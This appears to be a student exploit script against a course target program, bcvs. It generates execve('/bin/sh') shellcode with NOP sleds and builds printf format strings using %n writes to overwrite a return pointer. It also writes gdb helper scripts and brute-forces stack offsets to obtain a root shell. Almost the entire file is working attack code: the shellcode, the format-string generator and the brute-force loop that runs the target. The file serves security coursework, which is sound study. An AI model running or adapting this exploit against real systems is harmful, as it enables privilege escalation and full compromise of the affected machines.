#!/bin/bash

## ---------------------- Description ------------------------ ##
## This sploit inserts shellcode into the log buffer in
## main and then uses the printf vulnerability in writeLog
## to overwite the return pointer to go to this code.
## ----------------------------------------------------------- ##

## Note: Since this exploit and sploit1 don't depend on faking the block.list
## they should be removed eventually. This is just to allow us to execute them
## from the repo
rm -rf sploit2_dir
mkdir -p sploit2_dir
cd sploit2_dir
mkdir -p .bcvs
chmod 777 .bcvs
touch .bcvs/block.list

# ------------------- Create Scripts ------------------- #
cat <<EOS > "payload.py"
#!/usr/bin/python

import sys

bsize = 240
NOP="\x90"

shellcode1 = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
shellcode1 += "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
shellcode1 += "\x80\xe8\xdc\xff\xff\xff/bin/sh"

# Generated using the metasploit payload generator to not have these bytes
# \x00 \xFF \x0A
# Because of these byte exceptions the payload is kind of large (70 bytes)
shellcode2 = "\xd9\xf7\xbd\xde\x7e\xdf\xcf\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
shellcode2 += "\x0b\x83\xc0\x04\x31\x68\x16\x03\x68\x16\xe2\x2b\x14\xd4\x97"
shellcode2 += "\x4a\xbb\x8c\x4f\x41\x5f\xd8\x77\xf1\xb0\xa9\x1f\x01\xa7\x62"
shellcode2 += "\x82\x68\x59\xf4\xa1\x38\x4d\x0e\x26\xbc\x8d\x20\x44\xd5\xe3"
shellcode2 += "\x11\xfb\x4d\xfc\x3a\xa8\x04\x1d\x09\xce"

# Source http://www.exploit-db.com/exploits/13357/
# This shell re-opens the stdin fd. Cross your fingers that this will fix
# our problems...yay it worked. If only I had figured this out 5 days
# earlier...
shellcode3 = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
shellcode3 += "\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
shellcode3 += "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

if __name__ == '__main__':
  if len(sys.argv) > 1:
    bsize = int(sys.argv[1])

  shellcode = None
  if len(sys.argv) > 2:
    shellcode = eval("shellcode" + sys.argv[2])
  else:
    shellcode = shellcode1

  if bsize < len(shellcode):
    print("Your buffer size should be at least as long as the shellcode: {}".format(len(shellcode)))
    sys.exit(-1)

  full_shellcode = NOP * (bsize - len(shellcode) - 1)
  full_shellcode += shellcode
  sys.stdout.write(full_shellcode)
  sys.exit(0)
EOS

RPTR_REPEAT=6
rm -f gen_fmt_str.py
cat <<EOS > "gen_fmt_str.py"
#!/usr/bin/python

import sys

# ------------------------ Script Description ---------------------- #
# This script generates the attack string to be entered into printf.
# Args:
#   ret_ptr_addr - Address where the return pointer sits on the stack.
#                 This is the address where you want to insert the next
#                 argument.
#
#   retr_ptr_val - The value you want to write at ehe ret_ptr_addr.

def hexify(num):
  num = "%x" % (num)

  if len(num) % 2:
    num = '0'+num

  return num.decode('hex')

def hasTermByte(addr):
  for b in addr:
    if b == '\x0A' or b == '\xFF':
      return True

  return False

def fillInitialAddress(fstr, addr,  direction=1, overwrite_ts=False):

  # Create a list of addresses, incremented by 'direction'
  addr_list = [hexify(addr+(direction*i))[::-1] for i in range(4)]
  for a in addr_list:
    # If the addresses we are writing here have null bytes we may need to
    # redo the rewrite technique from earlier. Since the stack is ~always~
    # aligned to a 16 byte boundary not ending with 00 then we shouldn't
    # have problems
    fstr += a

  if overwrite_ts:
    ## Then we have to add the addresses to overwrite the tempString
    ## local variable
    ts_addrs = [hexify(addr-20+(direction*i))[::-1] for i in range(4)]
    for a in ts_addrs:
      fstr += a

  # This is just to pad for changes in stack addresses
  fstr *= $RPTR_REPEAT

  # We first need 2 bytes of padding because the '.bcvs/' at the beginning
  # of log is going to throw us off the word boundary
  fstr = "\x01\x01"+fstr

  return fstr

def findRequiredOffset(targetByte, cWritten):
  """Say you want to write 'targetByte' and so far you have currently
  written cWritten bytes. If you call this function with that info you
  will get back an offset for the next %{}x directive. Remember that
  since the offset is always increasing you will have wraparound from
  the desired byte but if you are writing correctly (increasing address)
  this shouldn't be a problem"""
  int_repr = byteStrToInt(targetByte)
  diff = 0
  while diff < 8:
    diff = int_repr - cWritten
    int_repr += 256

  return diff

def fillReturnPointerValue(fstr, targetRetAddr, offset, overwrite_ts=False):
  # This is the address in memory that the fprintf attack ultimately
  # wants to make writeLog return to. The addresses to write this address
  # to have already been setup we just need to create the correct
  # fprintf directives to write the bytes we want
  targetRetAddr = targetRetAddr[::-1]

  # Since the addresses are going on elsewhere on the stack and aren't part
  # of the format string we don't count them in the bytes written
  #written = len(fstr)
  written = 0

  # The direct parameter access offset. I assume that if a word is 4 bytes
  # then if we really want to access the first 'argument' we need to use
  # direct parameter access for variable offset/4
  dpa_offset = offset / 4

  # Now this portion of the format string will use the addrs in main's 'log'
  # to overwrite writeLog's return address to be targetRetAddr
  for i in range(4):
    # What padding do we need for the %x directive in order to write the
    # desired byte?
    diff = findRequiredOffset(targetRetAddr[i], written)
    fstr += "%{}x%{}\$n".format(diff, dpa_offset);
    #print("fstr = {}".format(fstr))
    written += diff
    dpa_offset += 1

  if overwrite_ts:
    for i in range(4):
      diff = findRequiredOffset('\x00', written)
      fstr += "%{}x%{}\$n".format(diff, dpa_offset);
      written += diff
      dpa_offset += 1

  # The format string should be all done and ready to go
  return fstr

def byteStrToInt(s):
  return int(s.encode('hex'), 16)

def usage():
  print("Usage: {} <ret ptr addr> <ret ptr value> [rptr offset] [printf_offset]".format(sys.argv[0]))


def padByteString(s):
  s = "0"*(8 - len(s)) + s
  return s

if __name__ == '__main__':
  if len(sys.argv) < 3:
    usage()
    sys.exit(1)

  rptr_offset = 0
  printf_offset = 0
  overwrite_ts = False

  if len(sys.argv) > 3:
    rptr_offset = int(sys.argv[3])
  if len(sys.argv) > 4:
    printf_offset = int(sys.argv[4])
  if len(sys.argv) > 5:
    if sys.argv[5] in ("1", "true", "True"):
      overwrite_ts = True
    else:
      overwrite_ts = False

  # Some input checking
  sys.argv[1] = padByteString(sys.argv[1])
  sys.argv[2] = padByteString(sys.argv[2])

  rptr_addr = sys.argv[1].decode('hex')
  rptr_val = sys.argv[2].decode('hex')
  rptr_addr_int = int(sys.argv[1], 16) - rptr_offset

  # This is the offset above the printf call to find the start of the
  # format string itself so we can access the addresses.
  #
  # So I've got a bit of a problem. Since the format string isn't stored
  # on the stack we cannot use the conventional method to read the memory
  # addresses stored there. Instead I'm going to insert the addresses in
  # the log buffer of main and read them from there like they were right
  # above printf's stack.
  #
  # After some trial and error I found that the return address for main is
  # 91 words (364 bytes) above printf's stack frame. The start of log however
  # is 18 words up (72 bytes) which is where we are concerned. It is actually
  # 19 above but printf knows to skip its return address when reading
  # variables (duh).
  init_fprintf_offset = 18 * 4
  init_fprintf_offset += 8  # (for the '.bcvs/' and the 2 padding bytes)
  init_fprintf_offset += printf_offset * 4

  format_str = ""
  format_str = fillInitialAddress(format_str, rptr_addr_int, 1, overwrite_ts)
  format_str = fillReturnPointerValue(format_str, rptr_val, init_fprintf_offset, overwrite_ts)

  #print("{}".format(format_str))
  sys.stdout.write(format_str)
  sys.exit(0)
EOS

cat <<EOS > "rerun_sploit.sh"
#!/bin/bash
cd ..
./sploit2.sh $1
cd sploit2_dir
EOS

cat <<EOS > "run_w_gdb.sh"
#!/bin/bash
WL_FRAME_ADDR_GUESS="bffff55C"
ATTACK_JMP_ADDR="804C328"
FORMAT_ADDRS_LEN=$(( 2 + 32 * $RPTR_REPEAT ))

SHELLCODE=\$(./payload.py 300 2)
FORMAT_STR=\$(./gen_fmt_str.py \$WL_FRAME_ADDR_GUESS \$ATTACK_JMP_ADDR 0 0 1)
FORMAT_ADDRS=\${FORMAT_STR:0:\$FORMAT_ADDRS_LEN}
FORMAT_DIRS=\${FORMAT_STR:\$FORMAT_ADDRS_LEN}
echo "Shellcode: \$SHELLCODE"
echo "Format String: \$FORMAT_STR"

touch temp_file_gdb

echo "Format Strin (Hex):"
echo -n "\$FORMAT_STR" | hexdump -C

echo "\${FORMAT_DIRS}\${SHELLCODE}" > format_str
gdb -ex "set args ci \"\$FORMAT_ADDRS\" < format_str" /opt/bcvs/bcvs
EOS

cat <<EOS > "test_generate.sh"
ATTACK_JMP_ADDR="804C328"
FORMAT_ADDRS_LEN=$(( 2 + 16 * $RPTR_REPEAT ))
OW_TS="0"

echo "ATTACK_JMP_ADDR: \$ATTACK_JMP_ADDR"
echo "FORMAT_ADDRS_LEN: \$FORMAT_ADDRS_LEN"
if [[ \$# -eq 1 ]]; then
  OW_TS=\$1
  echo "Overwrite tempString: \$OW_TS"
fi
SHELLCODE=\$(./payload.py 300 2)
FORMAT_STR=\$(./gen_fmt_str.py bffff60C \$ATTACK_JMP_ADDR 0 0 \$OW_TS)
FORMAT_ADDRS=\${FORMAT_STR:0:\$FORMAT_ADDRS_LEN}
FORMAT_DIRS=\${FORMAT_STR:\$FORMAT_ADDRS_LEN}
echo "Shellcode: \$SHELLCODE"
echo -n "\$FORMAT_STR" | hexdump -C
EOS

chmod +x payload.py
chmod +x gen_fmt_str.py
chmod +x rerun_sploit.sh
chmod +x run_w_gdb.sh
chmod +x test_generate.sh

if [[ $# -gt 0 && $1 == "-s" ]]; then
  # This way we can update the scripts without running the exploit
  echo "Skipping actual exploit. Scripts should be updated."
  exit 0
fi

SHELLCODE=`./payload.py 300 3`

if [[ $? == -1 ]]; then
  echo "failed to generate shellcode"
  exit -1
fi
echo "Created shellcode of length: ${#SHELLCODE}"
echo "Shellcode: ${SHELLCODE}"

touch temp_file

OFFSET=0
RET_PTR_LOC="bffff56C"  # The frame for writeLog shouldn't come before this
ATTACK_JMP_ADDR="804C328"

# Now that we store the address part of the format string on the stack in main
# this is no longer necessary
HEAP_PTR="804c2d8" # Given we don't have ASLR enabled this seems to be consistent

FORMAT_ADDRS_LEN=$(( 2 + 32 * $RPTR_REPEAT ))
echo "Format address length: $FORMAT_ADDRS_LEN"

# Now we brute force it. Hopefully if our initial guess isn't too far off we
# should get it soon.
while [[ $OFFSET -lt 8 ]]; do
  _OFFSET=$(( $OFFSET * 16 ))
  PRINTF_OFFSET=-3
  while [[ $PRINTF_OFFSET -lt 3 ]]; do
    echo "Generating format string [base,rptr_offset,printf_offset]: [$RET_PTR_LOC,$_OFFSET,$PRINTF_OFFSET]"
    FORMAT_STR=`./gen_fmt_str.py $RET_PTR_LOC $ATTACK_JMP_ADDR $_OFFSET $PRINTF_OFFSET 1`
    FORMAT_ADDRS=${FORMAT_STR:0:$FORMAT_ADDRS_LEN}  # These addresses will go into log (in main)
    FORMAT_DIRS=${FORMAT_STR:$FORMAT_ADDRS_LEN}  # These are the format directives

    if [[ $? != "0" ]]; then
      echo "Failed to generate format string"
      exit -1
    fi

    echo "Format String (hex):"
    echo  -n "$FORMAT_STR" | hexdump -C

    echo "Format String Addrs: ${FORMAT_ADDRS}"
    echo "Format Directives: ${FORMAT_DIRS}"

    echo -n "${FORMAT_DIRS}${SHELLCODE}" > "heap_attack_data"

    /opt/bcvs/bcvs ci "$FORMAT_ADDRS" < "heap_attack_data"

    PRINTF_OFFSET=$(( $PRINTF_OFFSET + 1 ))
  done
  OFFSET=$(( $OFFSET + 1 ))
done

rm -rf "$FORMAT_ADDRS"

echo "You should have gotten a root shell..."
